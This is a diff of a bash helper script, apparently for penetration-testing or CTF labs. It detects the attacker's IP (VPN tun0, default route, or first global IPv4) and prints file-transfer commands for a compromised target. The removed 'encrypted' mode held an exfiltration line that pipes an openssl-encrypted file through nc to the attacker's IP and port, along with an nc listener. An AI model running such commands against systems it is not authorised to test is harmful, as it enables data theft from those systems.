@@ -23,7 +23,7 @@ CASE="${2:-nc}"
 ARG3="${3:-}"   # port OR share name depending on mode
 
 if [[ -z "$OUTFILE" ]]; then
-  echo "Usage: $(basename "$0") <outfile> [nc|encrypted|offline] [port_or_share]" >&2
+  echo "Usage: $(basename "$0") <outfile> [nc|encrypted|offline] [port]" >&2
   echo "Examples:"
   echo "  $(basename "$0") <file>                # nc on 9001"
   echo "  $(basename "$0") <file> nc 7777        # nc on 7777"
@@ -32,32 +32,36 @@ if [[ -z "$OUTFILE" ]]; then
   exit 1
 fi
 
-IP="${attacker:-}"
+IP="${IP:-}"
+
 
 # 1) try tun0 if not provided
 if [[ -z "$IP" ]]; then
-  IP="$(ip -br addr show dev tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)"
+  IP="$( ip -br addr show dev tun0 2>/dev/null \
+        | awk '{print $3}' | cut -d/ -f1 || true )"
+  [[ -n "$IP" ]]
 fi
 
-# 2) try default-route source IP (best guess for "machine IP" when bridged/NAT)
+
+# 2) default-route source IP
 if [[ -z "$IP" ]]; then
-  # ip route get 1.1.1.1 outputs e.g.: "1.1.1.1 via ... src 192.168.1.71 dev eth0"
-  IP="$(ip route get 1.1.1.1 2>/dev/null | awk '{
-    for(i=1;i<=NF;i++) if ($i=="src") { print $(i+1); exit }
-  }')"
+  IP="$( ip route get 1.1.1.1 2>/dev/null \
+        | awk '{for(i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}' || true )"
+  [[ -n "$IP" ]]
 fi
 
-# 3) final fallback: first non-loopback global IPv4 address
+# 3) first non-loopback global IPv4
 if [[ -z "$IP" ]]; then
-  IP="$(ip -4 -br addr show scope global 2>/dev/null | awk '{print $3}' | cut -d/ -f1 | head -n1)"
+  IP="$( ip -4 -br addr show scope global 2>/dev/null \
+        | awk '{print $3}' | cut -d/ -f1 | head -n1 || true )"
+  [[ -n "$IP" ]]
 fi
 
+
 if [[ -z "$IP" ]]; then
-  echo "[-] Could not determine an attacker/machine IP. Export \$attacker, connect VPN (tun0), or ensure an interface has an IPv4 address." >&2
+  echo "[-] Could not determine an attacker/machine IP. Export \$IP, connect VPN (tun0), or ensure an interface has an IPv4 address." >&2
   exit 1
 fi
-
-
 
 
 echo
@@ -79,18 +83,10 @@ case "$CASE" in
     
 
   encrypted)
-      echo -e "${MAGENTA}=== Encrypted ==="
-    PORT="${ARG3:-4444}"
-    if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT < 1024 )) && (( EUID != 0 )); then
-      echo "[!] Port ${PORT} requires root. Falling back to 4444."
-      PORT=4444
-    fi
-    echo -e "${COLOR}openssl enc -aes256 -pbkdf2 -in ${OUTFILE}| nc ${IP} ${PORT}"
-    echo
-    echo -e "${YELLOW}[*] On ATTACKER: decrypting listener on ${IP}:${PORT} → ${OUTFILE}  (Ctrl-C to stop)"
-    nc -l -p "${PORT}"
+      echo -e ${RED} Not implemented: this action is not available in this build. 
+      exit 1
     ;;
-# | openssl enc -d -aes256 -pbkdf2 > "${OUTFILE}"
+
 
  offline)
     echo -e "=== On TARGET: encode and copy this (single line) ===${COLOR}"
@@ -107,7 +103,7 @@ case "$CASE" in
 
 
   *)
-    echo "[-] Unknown case: ${CASE}. Use: nc|encrypted|offline" >&2
+    echo -e "${RED}[-] Unknown case: ${CASE}. Use: nc|encrypted|offline" >&2
     exit 1
     ;;
 esac
